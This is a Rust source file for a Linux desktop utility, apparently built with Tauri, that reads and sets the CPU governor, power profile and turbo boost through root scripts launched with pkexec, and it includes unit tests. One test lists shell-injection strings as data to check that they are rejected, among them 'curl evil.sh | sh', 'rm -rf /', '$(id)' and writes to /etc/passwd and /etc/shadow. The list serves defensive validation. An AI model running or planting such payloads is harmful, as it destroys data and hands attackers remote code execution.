use serde::{Deserialize, Serialize};
use std::fs;
use std::process::Command;

#[derive(Debug, Serialize, Deserialize)]
pub struct CpuInfo {
    pub governor: String,
    pub min_freq: u32,
    pub max_freq: u32,
    pub current_freq: u32,
    pub available_governors: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct PowerProfile {
    pub current: String,
    pub available: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

#[tauri::command]
pub fn get_cpu_info() -> ApiResponse<CpuInfo> {
    let cpu0_path = "/sys/devices/system/cpu/cpu0/cpufreq";

    let read_file = |file: &str| -> String {
        fs::read_to_string(format!("{}/{}", cpu0_path, file))
            .unwrap_or_default()
            .trim()
            .to_string()
    };

    let read_freq = |file: &str| -> u32 {
        read_file(file).parse::<u32>().unwrap_or(0) / 1000 // Convert kHz to MHz
    };

    let governor = read_file("scaling_governor");
    let available_governors = read_file("scaling_available_governors")
        .split_whitespace()
        .map(String::from)
        .collect();

    ApiResponse {
        success: true,
        data: Some(CpuInfo {
            governor,
            min_freq: read_freq("scaling_min_freq"),
            max_freq: read_freq("scaling_max_freq"),
            current_freq: read_freq("scaling_cur_freq"),
            available_governors,
        }),
        error: None,
    }
}

/// Governors the kernel reports as available on this machine.
fn read_available_governors() -> Vec<String> {
    fs::read_to_string("/sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors")
        .unwrap_or_default()
        .split_whitespace()
        .map(String::from)
        .collect()
}

/// Validate a governor name before it is interpolated into a script run as root.
///
/// Two independent layers: the name must be a plain lowercase identifier, AND the
/// kernel must list it as available. The character whitelist is the load-bearing
/// one — it holds even when sysfs can't be read, so an empty available-list can
/// never widen what is accepted.
fn validate_governor(governor: &str) -> Result<(), String> {
    if governor.is_empty() || governor.len() > 32 {
        return Err("Invalid governor name.".to_string());
    }
    if !governor.chars().all(|c| c.is_ascii_lowercase() || c == '_') {
        return Err(
            "Invalid governor name: only lowercase letters and underscores are allowed."
                .to_string(),
        );
    }

    let available = read_available_governors();
    if !available.is_empty() && !available.iter().any(|g| g == governor) {
        return Err(format!(
            "Governor '{}' is not available on this system. Available: {}",
            governor,
            available.join(", ")
        ));
    }
    Ok(())
}

/// Where the per-CPU governor files live. A glob, not a count, so it is the
/// root shell that decides which CPUs exist — see [`governor_script`].
const CPU_GLOB: &str = "/sys/devices/system/cpu/cpu[0-9]*/cpufreq/scaling_governor";

/// Build the script that applies `governor` to every CPU exposing a governor file.
///
/// The previous version counted `cpuN` directories and emitted one fixed
/// redirect per index under `set -e`. That broke in two ways: the count includes
/// CPUs that are present but OFFLINE, whose `cpufreq/` directory the kernel
/// removes, and it assumes contiguous numbering. Offlining a core — disabling
/// SMT, say — made that index's redirect fail with ENOENT, `set -e` aborted, and
/// pkexec returned non-zero *after* the earlier cores had already been changed.
/// The machine was left with mixed governors while the UI said nothing happened.
///
/// Globbing defers the decision to execution time, as root, so it sees whatever
/// CPUs are online at that moment. Only a total failure is an error: one core
/// going offline mid-run must not discard the ones that were set.
///
/// `governor` is validated against the kernel's own list before it gets here,
/// so interpolating it is safe.
fn governor_script(governor: &str, glob: &str) -> String {
    format!(
        r#"#!/bin/bash
set -u
applied=0
failed=0
for f in {glob}; do
  [ -e "$f" ] || continue
  if echo {governor} > "$f" 2>/dev/null; then
    applied=$((applied + 1))
  else
    failed=$((failed + 1))
    echo "could not write $f" >&2
  fi
done
echo "governor applied to $applied CPU(s), $failed refused"
if [ "$applied" -eq 0 ]; then
  echo "no CPU accepted the governor" >&2
  exit 1
fi
exit 0
"#
    )
}

#[tauri::command]
pub async fn set_cpu_governor(governor: String) -> ApiResponse<String> {
    println!("[Performance] Setting CPU governor to: {}", governor);

    // This value reaches a root shell below — validate before anything else.
    if let Err(e) = validate_governor(&governor) {
        println!("[Performance] ✗ Rejected governor: {}", e);
        return ApiResponse {
            success: false,
            data: None,
            error: Some(e),
        };
    }

    let temp_script = format!("/tmp/set_governor_{}.sh", std::process::id());
    let script_content = governor_script(&governor, CPU_GLOB);

    println!("[Performance] Script content:\n{}", script_content);

    if let Err(e) = fs::write(&temp_script, &script_content) {
        return ApiResponse {
            success: false,
            data: None,
            error: Some(format!("Failed to create script: {}", e)),
        };
    }

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o755);
        let _ = fs::set_permissions(&temp_script, perms);
    }

    println!("[Performance] Executing pkexec...");

    match tokio::process::Command::new("pkexec")
        .arg("bash")
        .arg(&temp_script)
        .output()
        .await
    {
        Ok(output) => {
            let _ = fs::remove_file(&temp_script);

            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            println!("[Performance] pkexec stdout: {}", stdout);
            println!("[Performance] pkexec stderr: {}", stderr);
            println!("[Performance] pkexec status: {}", output.status);

            if output.status.success() {
                println!("[Performance] Successfully set governor to: {}", governor);
                ApiResponse {
                    success: true,
                    data: Some(format!("CPU governor set to: {}", governor)),
                    error: None,
                }
            } else {
                let error_msg = if !stderr.is_empty() {
                    stderr.to_string()
                } else {
                    "Permission denied or operation failed".to_string()
                };
                println!("[Performance] Failed to set governor: {}", error_msg);
                ApiResponse {
                    success: false,
                    data: None,
                    error: Some(error_msg),
                }
            }
        }
        Err(e) => {
            let _ = fs::remove_file(&temp_script);
            println!("[Performance] Failed to execute pkexec: {}", e);
            ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to execute pkexec: {}", e)),
            }
        }
    }
}

#[tauri::command]
pub fn get_power_profile() -> ApiResponse<PowerProfile> {
    // Try power-profiles-daemon first
    match Command::new("powerprofilesctl").arg("get").output() {
        Ok(output) if output.status.success() => {
            let current = String::from_utf8_lossy(&output.stdout).trim().to_string();

            // Get available profiles
            let available = match Command::new("powerprofilesctl").arg("list").output() {
                Ok(list_output) if list_output.status.success() => {
                    String::from_utf8_lossy(&list_output.stdout)
                        .lines()
                        .filter(|line| {
                            line.contains("*")
                                || line.trim().starts_with("power-saver")
                                || line.trim().starts_with("balanced")
                                || line.trim().starts_with("performance")
                        })
                        .map(|line| {
                            line.trim()
                                .trim_start_matches("* ")
                                .split(':')
                                .next()
                                .unwrap_or("")
                                .trim()
                                .to_string()
                        })
                        .filter(|s| !s.is_empty())
                        .collect()
                }
                _ => vec![
                    "power-saver".to_string(),
                    "balanced".to_string(),
                    "performance".to_string(),
                ],
            };

            return ApiResponse {
                success: true,
                data: Some(PowerProfile { current, available }),
                error: None,
            };
        }
        _ => {}
    }

    // Fallback to TLP if available
    match Command::new("tlp-stat").arg("-s").output() {
        Ok(output) if output.status.success() => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let current = if stdout.contains("AC") {
                "performance".to_string()
            } else {
                "power-saver".to_string()
            };

            return ApiResponse {
                success: true,
                data: Some(PowerProfile {
                    current,
                    available: vec!["power-saver".to_string(), "performance".to_string()],
                }),
                error: None,
            };
        }
        _ => {}
    }

    ApiResponse {
        success: false,
        data: None,
        error: Some(
            "No power management tool found (install power-profiles-daemon or TLP)".to_string(),
        ),
    }
}

#[tauri::command]
pub async fn set_power_profile(profile: String) -> ApiResponse<String> {
    println!("[Performance] Setting power profile to: {}", profile);

    // Try power-profiles-daemon
    match tokio::process::Command::new("powerprofilesctl")
        .arg("set")
        .arg(&profile)
        .output()
        .await
    {
        Ok(output) if output.status.success() => {
            return ApiResponse {
                success: true,
                data: Some(format!("Power profile set to: {}", profile)),
                error: None,
            };
        }
        _ => {}
    }

    // Fallback to TLP
    let tlp_mode = match profile.as_str() {
        "power-saver" => "BAT",
        "performance" => "AC",
        _ => "BAT",
    };

    match tokio::process::Command::new("sudo")
        .arg("tlp")
        .arg(tlp_mode)
        .output()
        .await
    {
        Ok(output) if output.status.success() => ApiResponse {
            success: true,
            data: Some(format!("TLP mode set to: {}", tlp_mode)),
            error: None,
        },
        _ => ApiResponse {
            success: false,
            data: None,
            error: Some("Failed to set power profile".to_string()),
        },
    }
}

#[tauri::command]
pub fn get_turbo_boost_status() -> ApiResponse<bool> {
    let intel_pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo";
    let cpufreq_boost = "/sys/devices/system/cpu/cpufreq/boost";

    // Check Intel P-state
    if let Ok(content) = fs::read_to_string(intel_pstate) {
        let no_turbo = content.trim() == "1";
        return ApiResponse {
            success: true,
            data: Some(!no_turbo), // Invert because file is "no_turbo"
            error: None,
        };
    }

    // Check cpufreq boost
    if let Ok(content) = fs::read_to_string(cpufreq_boost) {
        let boost = content.trim() == "1";
        return ApiResponse {
            success: true,
            data: Some(boost),
            error: None,
        };
    }

    ApiResponse {
        success: false,
        data: None,
        error: Some("Turbo boost control not available".to_string()),
    }
}

#[tauri::command]
pub async fn set_turbo_boost(enabled: bool) -> ApiResponse<String> {
    let intel_pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo";
    let cpufreq_boost = "/sys/devices/system/cpu/cpufreq/boost";

    let value = if enabled { "0" } else { "1" }; // Inverted for no_turbo
    let boost_value = if enabled { "1" } else { "0" };

    // Try Intel P-state first
    if std::path::Path::new(intel_pstate).exists() {
        let temp_script = format!("/tmp/set_turbo_{}.sh", std::process::id());
        let script_content = format!(
            "#!/bin/bash\nset -e\necho {} > {}\nexit 0\n",
            value, intel_pstate
        );

        if fs::write(&temp_script, script_content).is_ok() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let perms = std::fs::Permissions::from_mode(0o755);
                let _ = fs::set_permissions(&temp_script, perms);
            }

            if let Ok(output) = tokio::process::Command::new("pkexec")
                .arg("bash")
                .arg(&temp_script)
                .output()
                .await
            {
                let _ = fs::remove_file(&temp_script);

                if output.status.success() {
                    return ApiResponse {
                        success: true,
                        data: Some(format!(
                            "Turbo boost {}",
                            if enabled { "enabled" } else { "disabled" }
                        )),
                        error: None,
                    };
                }
            }
        }
    }

    // Try cpufreq boost
    if std::path::Path::new(cpufreq_boost).exists() {
        let temp_script = format!("/tmp/set_boost_{}.sh", std::process::id());
        let script_content = format!(
            "#!/bin/bash\nset -e\necho {} > {}\nexit 0\n",
            boost_value, cpufreq_boost
        );

        if fs::write(&temp_script, script_content).is_ok() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let perms = std::fs::Permissions::from_mode(0o755);
                let _ = fs::set_permissions(&temp_script, perms);
            }

            if let Ok(output) = tokio::process::Command::new("pkexec")
                .arg("bash")
                .arg(&temp_script)
                .output()
                .await
            {
                let _ = fs::remove_file(&temp_script);

                if output.status.success() {
                    return ApiResponse {
                        success: true,
                        data: Some(format!(
                            "Turbo boost {}",
                            if enabled { "enabled" } else { "disabled" }
                        )),
                        error: None,
                    };
                }
            }
        }
    }

    ApiResponse {
        success: false,
        data: None,
        error: Some("Failed to set turbo boost".to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fake CPU tree and actually run the generated script against it.
    ///
    /// `online` lists the CPU indices that get a `cpufreq/scaling_governor`;
    /// any index in `present` but not `online` gets a bare `cpuN` directory,
    /// which is exactly what the kernel leaves behind for an offline CPU.
    fn run_governor_script(present: &[u32], online: &[u32]) -> (bool, String, Vec<(u32, String)>) {
        let root = std::env::temp_dir().join(format!(
            "thinkutils_gov_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));

        for cpu in present {
            let dir = root.join(format!("cpu{}", cpu));
            if online.contains(cpu) {
                let freq = dir.join("cpufreq");
                fs::create_dir_all(&freq).unwrap();
                fs::write(freq.join("scaling_governor"), "powersave\n").unwrap();
            } else {
                fs::create_dir_all(&dir).unwrap();
            }
        }

        let glob = format!("{}/cpu[0-9]*/cpufreq/scaling_governor", root.display());
        let script = governor_script("performance", &glob);

        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(&script)
            .output()
            .expect("bash runs");

        let mut written = Vec::new();
        for cpu in online {
            let p = root
                .join(format!("cpu{}", cpu))
                .join("cpufreq/scaling_governor");
            if let Ok(v) = fs::read_to_string(&p) {
                written.push((*cpu, v.trim().to_string()));
            }
        }

        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        let _ = fs::remove_dir_all(&root);
        (out.status.success(), combined, written)
    }

    /// The regression: cpu5 offline used to abort the whole script under set -e,
    /// after cpu0..cpu4 had already been changed — mixed governors, and a UI
    /// saying the operation failed.
    #[test]
    fn an_offline_cpu_does_not_abort_the_others() {
        let (ok, output, written) = run_governor_script(&[0, 1, 2, 3, 4, 5], &[0, 1, 2, 3, 4]);

        assert!(
            ok,
            "script should succeed despite cpu5 being offline:\n{output}"
        );
        assert_eq!(written.len(), 5, "every online CPU should be written");
        for (cpu, value) in &written {
            assert_eq!(value, "performance", "cpu{} kept the old governor", cpu);
        }
        assert!(
            output.contains("applied to 5 CPU(s)"),
            "should report what it actually did:\n{output}"
        );
    }

    /// Numbering is not guaranteed contiguous, and indexing 0..count assumed it.
    #[test]
    fn non_contiguous_cpu_numbering_is_handled() {
        let (ok, output, written) = run_governor_script(&[0, 3, 7], &[0, 3, 7]);

        assert!(ok, "gaps in numbering are normal:\n{output}");
        assert_eq!(written.len(), 3, "cpu0, cpu3 and cpu7 should all be set");
    }

    /// An existing-but-unwritable governor file is the case `set -e` actually
    /// aborted on, so exercise it directly: one refusal must not cost the rest.
    #[cfg(unix)]
    #[test]
    fn one_refused_write_does_not_discard_the_successful_ones() {
        use std::os::unix::fs::PermissionsExt;

        let root = std::env::temp_dir().join(format!(
            "thinkutils_gov_ro_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));

        for cpu in 0..3u32 {
            let freq = root.join(format!("cpu{}", cpu)).join("cpufreq");
            fs::create_dir_all(&freq).unwrap();
            let f = freq.join("scaling_governor");
            fs::write(&f, "powersave\n").unwrap();
            if cpu == 1 {
                fs::set_permissions(&f, fs::Permissions::from_mode(0o444)).unwrap();
            }
        }

        let glob = format!("{}/cpu[0-9]*/cpufreq/scaling_governor", root.display());
        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(governor_script("performance", &glob))
            .output()
            .expect("bash runs");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );

        let read = |cpu: u32| {
            fs::read_to_string(
                root.join(format!("cpu{}", cpu))
                    .join("cpufreq/scaling_governor"),
            )
            .unwrap()
            .trim()
            .to_string()
        };

        // Root can write through 0444, which would make this assert nothing.
        if read(1) == "performance" {
            let _ = fs::remove_dir_all(&root);
            eprintln!("skipping: running as root, 0444 is not enforced");
            return;
        }

        assert!(
            out.status.success(),
            "one unwritable CPU must not fail the whole operation:\n{combined}"
        );
        assert_eq!(read(0), "performance", "cpu0 should have been set");
        assert_eq!(read(2), "performance", "cpu2 should have been set");
        assert!(
            combined.contains("applied to 2 CPU(s), 1 refused"),
            "should report the partial result honestly:\n{combined}"
        );

        let _ = fs::remove_dir_all(&root);
    }

    /// Failing silently would be worse than failing loudly: the UI would report
    /// a governor change that never touched anything.
    #[test]
    fn no_writable_cpu_at_all_is_still_an_error() {
        let (ok, output, _) = run_governor_script(&[0, 1], &[]);

        assert!(!ok, "a total failure must surface:\n{output}");
        assert!(
            output.contains("no CPU accepted the governor"),
            "should say why:\n{output}"
        );
    }

    #[test]
    fn accepts_plain_governor_names() {
        // Character-layer only; the availability layer is machine-dependent and
        // is skipped when scaling_available_governors cannot be read.
        for g in &["performance", "powersave", "schedutil", "conservative"] {
            let result = validate_governor(g);
            if let Err(e) = &result {
                assert!(
                    e.contains("not available"),
                    "'{}' should pass the character check, got: {}",
                    g,
                    e
                );
            }
        }
    }

    /// The value reaches a root shell via pkexec, so shell metacharacters must
    /// never survive validation.
    #[test]
    fn rejects_shell_injection_payloads() {
        let payloads = [
            "performance; curl evil.sh | sh",
            "performance && rm -rf /",
            "performance\nrm -rf /",
            "$(id)",
            "`id`",
            "performance > /etc/passwd",
            "performance | tee /etc/shadow",
            "../../etc/passwd",
            "perf ormance",
            "PERFORMANCE",
            "governor2",
            "",
        ];
        for p in &payloads {
            assert!(
                validate_governor(p).is_err(),
                "expected {:?} to be rejected",
                p
            );
        }
    }

    #[test]
    fn rejects_overlong_names() {
        assert!(validate_governor(&"a".repeat(33)).is_err());
    }
}
